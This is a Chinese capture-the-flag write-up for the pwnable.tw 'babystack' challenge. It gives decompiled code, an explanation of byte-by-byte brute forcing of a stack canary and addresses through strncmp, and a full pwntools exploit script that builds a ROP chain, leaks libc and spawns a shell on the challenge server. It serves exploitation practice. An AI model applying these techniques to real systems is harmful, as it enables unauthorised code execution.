---
title: pwnable.tw->babystack
categories:
- pwnable.tw
---
# pwnable.tw->babystack

## 前言

重新开始刷pwnable.tw，发现一年下来自己好像并没有什么长进。。做这里的题依然是举步维艰，记录一下这道折腾了三天的题QAQ。

## 程序逻辑

程序只有Login和Magic两个功能，只有Login过了check才能将0x202014置为1，进而可以使用Magic功能。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // rcx
  __int64 v4; // rdx
  char v6; // [rsp+0h] [rbp-60h]
  __int64 buf; // [rsp+40h] [rbp-20h]
  __int64 v8; // [rsp+48h] [rbp-18h]
  char choice; // [rsp+50h] [rbp-10h]

  Init();
  dword_202018[0] = open("/dev/urandom", 0);
  read(dword_202018[0], &buf, 0x10uLL);
  v3 = qword_202020;
  v4 = v8;
  *(_QWORD *)qword_202020 = buf;
  v3[1] = v4;                                   // ？
  close(dword_202018[0]);
  while ( 1 )
  {
    write(1, ">> ", 3uLL);
    _read_chk(0LL, &choice, 0x10LL, 0x10LL);
    if ( choice == '2' )
      break;
    if ( choice == '3' )
    {
      if ( unk_202014 )
        magic(&v6);
      else
        puts("Invalid choice");
    }
    else if ( choice == '1' )
    {
      if ( unk_202014 )
        unk_202014 = 0;
      else
        Login((const char *)&buf);              // set unk_202014 = 1
    }
    else
    {
      puts("Invalid choice");
    }
  }
  if ( !unk_202014 )
    exit(0);
  memcmp(&buf, qword_202020, 0x10uLL);
  return 0;
}
```

Login需要跟随机数比较，可以输入'\x00'+*绕过strncmp，进而使用Magic函数，但是后面发现这样绕不过最终的memcmp检查。

```c
int __fastcall Login(const char *buf)
{
  size_t pwd_len; // rax
  char s; // [rsp+10h] [rbp-80h]

  printf("Your passowrd :");
  get_input(&s, 0x7Fu);
  pwd_len = strlen(&s);
  if ( strncmp(&s, buf, pwd_len) )              // pwn_len == 0 ??
    return puts("Failed !");
  unk_202014 = 1;
  return puts("Login Success !");
}
```

magic函数可以strcpy，漏洞基本就在这里了

```c
int __fastcall magic(char *des)
{
  char src; // [rsp+10h] [rbp-80h]

  printf("Copy :");
  get_input(&src, 0x3Fu);
  strcpy(des, &src);                            // 后面的也拷贝进去
  return puts("It is magic copy !");
}
```

## 漏洞利用

刚才的magic试过之后发现可以溢出rbp-rbp+0x1f，但是因为最后的memcmp检查会和mmap的地址里的随机数对比，我们需要得到最开始的0x10大小的canary。这里的方法就是刚刚不久用过的爆破，因为strncmp是按size长度比较的，我们可以以'\x00'为分割，逐字节爆破，同样地，观察之后可以发现Login里的比较用的是栈里的数据，后面跟着的就是stack有关的地址和程序相关地址，因此使用相同的方法爆破出这两个地址，最终使用gadgets调用get_input读取更大输入，泄露libc并获取shell。

这里卡了我很长时间的一点是截断，strcpy需要调用多次且下一次要清空高字节的非零字符，方能strcpy写入数据。

还有输入choice的地方输入'1'*8和'1'是一样的，这个在栈地址对应canary后面，在爆破code base的时候需要输入8个1来填充。

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./babystack')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./babystack')

else:
    libc = ELF('./libc_64.so.6')
    p = remote('chall.pwnable.tw',10205)

def Login(passwd,flag=1):
    p.recvuntil('>> ')
    p.send('1')
    p.recvuntil("Your passowrd :")
    if flag:
        p.send(passwd+'\x00')
    else:
        p.send(passwd)

def Login1():
    p.recvuntil('>> ')
    p.send('1')

def Login8(passwd):
    p.recvuntil('>> ')
    p.send('1'*0x10)
    p.recvuntil("Your passowrd :")
    p.send(passwd+'\x00')

def Exit():
    p.recvuntil('>> ')
    p.send('2')

def MagicCopy(content):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil("Copy :")
    p.send(content)

leave_ret_addr = 0xd0d
pop_rdi = 0x10c3
pop_rsi_r15 = 0x10c1

def exp():
    #leak canary
    try_lis = []
    for i in range(1,0x100):
        if i != 0xa:
            try_lis.append(p8(i))
    #boom

    res = ""
    for i in range(0x10):
        for item in try_lis:
            Login(res+item)
            judge = p.recvline()
            if "Failed" in judge:
                continue
            else:
                #raw_input()
                res += item
                Login1()
                break
    #for item in list(res):
    canary = res
    #leak stack addr
    for i in range(6):
        for item in try_lis:
            Login(res+item)
            judge = p.recvline()
            if "Failed" in judge:
                continue
            else:
                res += item
                Login1()
                break
    #for item in list(res):
    stack_addr = u64(res[-6:].ljust(8,'\x00'))
    ebp_addr = stack_addr - 0xe1
    log.success("ebp addr => " + hex(ebp_addr))
    #leak code base
    res = res[0:0x10]+'1'*0x10


    for i in range(0x6):
        for item in try_lis:
            Login8(res+item)
            judge = p.recvline()
            if "Failed" in judge:
                continue
            else:
                res += item
                Login1()
                break
    code_base = u64(res[-6:].ljust(8,'\x00')) - 0x60 - 0x1000
    log.success('code base => ' + hex(code_base))

    #Login(canary)
    #leak libc
    #main_addr =
    '''
    padding = '\x00'
    padding += p64(pop_rdi+code_base)+p64(0)
    padding += p64(pop_rsi_r15+code_base)+p64(elf.bss()+code_base)+p64(0)
    padding += p64(code_base+elf.plt['read'])
    padding += p64(code_base+elf.bss()+8)
    padding += p64(leave_ret_addr+code_base)[:-1]
    '''
    #first
    padding = '\x00'+'a'*0x3f+canary
    padding = padding.ljust(0x60,'a')
    payload = padding
    payload += 'b'*0x18
    payload += p64(ebp_addr-0x60+1-8)[:-1]
    Login(payload,0)
    MagicCopy('a'*0x3f)
    Login1()
    #second - 1
    payload = padding + 'b'*0x17+"\x00"
    Login(payload,0)
    MagicCopy('a'*0x3f)
    Login1()
    #second - 2
    payload = padding + 'b'*0x10+p64(code_base+0xdef)
    Login(payload,0)
    MagicCopy('a'*0x3f)
    Login1()
    #third - 1
    payload = padding + 'b'*0xf+"\x00"
    Login(payload,0)
    MagicCopy('a'*0x3f)
    Login1()
    #third - 2
    payload = padding + 'b'*0x8 + p64(code_base+leave_ret_addr)
    Login(payload,0)
    MagicCopy('a'*0x3f)
    Login1()
    #fourth - 1
    payload = padding + 'b'*0x7 + "\x00"
    Login(payload,0)
    MagicCopy('a'*0x3f)
    Login1()
    #fourth - 2
    payload = padding + p64(ebp_addr-0xf0+1-8)
    Login(payload,0)
    MagicCopy('a'*0x3f)
    #gdb.attach(p,'b* 0x0000555555555052')
    Login1()

    #set rops
    padding = '\x00'+p64(pop_rdi+code_base)+p64(ebp_addr-0xbf)
    padding += p64(pop_rsi_r15+code_base)+p64(0x100)+p64(0)
    padding += p64(code_base+0xca0)
    padding += p64(code_base+elf.bss()+8)
    padding += p64(leave_ret_addr+code_base)[:-1]
    padding += canary + "\x00"
    Login(padding)
    Exit()

    #leak libc
    pop_ebp = 0xbd0
    payload = p64(pop_rdi+code_base)+p64(elf.got['puts']+code_base)+p64(elf.plt['puts']+code_base)+p64(pop_rdi+code_base)+p64(ebp_addr-0x67)+p64(pop_rsi_r15+code_base)+p64(0x100)+p64(0)+p64(pop_ebp+code_base)+p64(elf.bss()+code_base)+p64(code_base+0xca0)
    #raw_input()
    p.send(payload)
    #
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - libc.sym['puts']
    log.success("libc base => " + hex(libc_base))
    #get shell
    payload = p64(pop_rdi+code_base)+p64(ebp_addr-0x67+0x30)+p64(pop_rsi_r15+code_base)+p64(0)*2+p64(libc_base+libc.sym['system'])+"/bin/sh\x00"
    #raw_input()
    p.send(payload)
    p.sendline("cat flag*")
    p.interactive()

exp()
```
